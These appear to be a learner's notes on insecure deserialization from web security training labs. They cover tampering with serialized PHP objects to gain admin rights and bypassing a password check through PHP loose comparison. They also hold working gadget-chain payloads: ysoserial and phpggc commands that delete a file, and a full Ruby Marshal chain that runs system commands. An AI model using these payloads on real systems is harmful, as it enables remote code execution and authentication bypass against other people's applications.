1. Identifying
2. Exploiting
	1. Object attributes
	2. Data types
	3. Gadget chains
		1. Java
		2. PHP
		3. Ruby

# Identifying

Burp can identify almost everything
php `O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`
java `rO0`

# Exploiting

## Object attributes

We can modify the following object to change admin attribute.
`O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}`
## Data types

In PHP `5 == "5"` evaluates to true
On PHP 7.x and earlier, `0 == "Example string"` evaluates to true. PHP treats the entire string as the integer 0
So in the following logic, we can pass the integer 0 in the password
```
$login = unserialize($_COOKIE) 
if ($login['password'] == $password) { 
// log in successfully 
}
```

## Gadget chains

### Java

```bash
java -jar ysoserial.jar CommonsCollections2 'rm /home/carlos/morale.txt'
```

### PHP

```bash
phpggc Symfony/RCE4 exec "rm /home/carlos/morale.txt" | base64 -w0; echo
```
### Ruby deserialization using documented gadget chain

Run this in https://www.jdoodle.com/execute-ruby-online
```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer
require 'Base64'

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.strict_encode64(payload)
# puts payload.inspect
```